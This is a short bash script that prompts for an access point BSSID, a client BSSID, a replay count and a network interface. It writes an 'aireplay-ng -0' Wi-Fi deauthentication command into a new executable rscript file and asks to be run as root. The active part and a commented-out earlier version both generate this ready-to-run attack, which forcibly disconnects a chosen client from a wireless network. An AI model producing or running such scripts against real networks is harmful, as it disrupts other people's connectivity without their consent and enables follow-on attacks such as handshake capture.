#!/bin/bash

echo please run this script as root

echo  please enter AP bssid:

read apb

echo please enter Client bssid:

read cb

echo please enter the replay counts:

read rc

echo please enter the interface name:

read in

name=rscript

if [[ -e $name.sh  ]]; then
	scount=0
	while [[ -e $name$scount.sh  ]];
	do
	    let  scount++
    	done
    	name=$name$scount
	echo aireplay-ng -0 $rc -a $apb -c $cb $in >>  "$name".sh
	chmod +x $name.sh
else

echo aireplay-ng -0 $rc -a $apb -c $cb $in >>  "$name".sh
chmod +x $name.sh

fi

#scout=0

#if  [ ! -f rscript.sh ];  then
#	echo aireplay-ng -0 $rc -a $apb -c $cb $in >>  rscript$scout.sh
#	chmod +x rscript.sh
#else
#	scout=$(($scout + 1))
#	echo  aireplay-ng -0 $rc -a $apb -c $cb $in >>  rscript$scout.sh
#	chmod +x rscript$scout.sh
#fi

#if [ -e x.txt  ]
